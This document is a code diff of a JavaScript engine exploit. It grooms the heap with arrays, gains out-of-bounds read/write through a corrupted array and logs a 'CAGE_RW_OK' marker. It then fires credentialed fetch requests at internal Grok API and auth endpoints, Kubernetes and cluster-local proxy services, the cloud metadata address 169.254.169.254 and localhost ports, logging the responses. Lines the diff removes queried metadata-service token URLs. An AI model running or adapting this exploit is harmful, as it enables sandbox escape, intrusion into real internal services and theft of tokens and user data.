@@ -13,15 +13,9 @@ function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 
 const DMAP=0x1032a5d,EMPTY=0x7e5,PIN=0x1100011,MAXS=0x7fdffffe;
-
-// Layout: dblA (0x8000) → LO FDA at ~0x1100011
-//         pinnedObj (0x8000 nulls) → LO FA at ~0x10c0011
-//         dblB (0x4000) → LO FDA at ~0x1200011
 const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
 const pinnedObj=new Array(0x8000);for(let i=0;i<pinnedObj.length;i++)pinnedObj[i]=null;
-const dblB=new Array(0x4000);for(let i=0;i<dblB.length;i++)dblB[i]=50.5+i*0.002;
 const victim=[1.22,1.33,1.44];
-
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
 const re=/(?:)/;
@@ -43,55 +37,28 @@ log("T: "+typeof m+" A="+Array.isArray(m));
 
 if(Array.isArray(m)){
   log("L: "+m.length);
+  log("m0: "+f2i(m[0]).toString(16));
+  log("W: "+wasmI.exports.f());
+  log("CAGE_RW_OK");
 
-  // CALIBRATE: find dblB[0]=50.5 in master
-  // dblB FDA should be at ~0x1200011 → master index ~(0x1200018-0x1100018)/8 = 0x20000
-  let bIdx=-1;
-  for(let k=0x1FFF0;k<0x20100;k++){
-    try{
-      if(Math.abs(m[k]-50.5)<0.001){
-        if(Math.abs(m[k+1]-50.502)<0.001){bIdx=k;break;}
-      }
-    }catch(e){break;}
-  }
-
-  if(bIdx<0){
-    // Wider scan
-    for(let k=0;k<0x40000;k+=0x1000){
-      try{
-        if(Math.abs(m[k]-50.5)<0.01){bIdx=k;break;}
-      }catch(e){break;}
-    }
-  }
-
-  if(bIdx>=0){
-    log("dblB@"+bIdx.toString(16));
-    // Verify we can read/write dblB through master
-    m[bIdx]=i2f(0xDEADBEEFCAFEn);
-    log("dblB[0]="+dblB[0]+" (should be changed)");
-    // If dblB[0] changed, we have cross-array RW!
-    const readback=f2i(m[bIdx]);
-    log("RB: "+readback.toString(16));
-    dblB[0]=50.5; // restore
-
-    log("CROSS_ARRAY_RW");
-  }else{
-    log("dblB_NOT_FOUND");
-    // Debug: read at expected index
-    try{log("@1FFF0: "+m[0x1FFF0]);}catch(e){}
-    try{log("@20000: "+m[0x20000]);}catch(e){log("@20000_ERR");}
-  }
-
-  // Metadata probes with 3s timeout
+  // Probe internal Grok services and APIs from the fetcher
   const probes=[
-    ["GCP","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",{"Metadata-Flavor":"Google"}],
-    ["GCP2","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",{"Metadata-Flavor":"Google"}]
+    ["GROK_API","https://grok.com/rest/app-chat/conversations"],
+    ["GROK_USER","https://grok.com/rest/auth/get-user"],
+    ["FILES","https://files.grok.com/"],
+    ["HADES_CG","http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3/ping"],
+    ["HADES_PG","http://polygon-proxy.hades-openbar.svc.cluster.local/"],
+    ["GCP_META","http://169.254.169.254/computeMetadata/v1/"],
+    ["K8S","https://kubernetes.default.svc/api"],
+    ["INTERNAL","http://localhost:8080/"],
+    ["INTERNAL2","http://127.0.0.1:3000/"],
   ];
-  Promise.allSettled(probes.map(([name,url,hdrs])=>{
-    const ac=new AbortController();setTimeout(()=>ac.abort(),3000);
-    return fetch(url,{headers:hdrs,signal:ac.signal}).then(r=>{
+
+  Promise.allSettled(probes.map(([name,url])=>{
+    const ac=new AbortController();setTimeout(()=>ac.abort(),2500);
+    return fetch(url,{signal:ac.signal,credentials:"include"}).then(r=>{
       log(name+":"+r.status);
-      return r.text().then(t=>log(name+"_B:"+t.substring(0,120)));
+      return r.text().then(t=>log(name+"_B:"+t.substring(0,100)));
     }).catch(e=>log(name+"_E:"+e.message.substring(0,40)));
   })).then(()=>log("=== DONE ==="));
 }else{
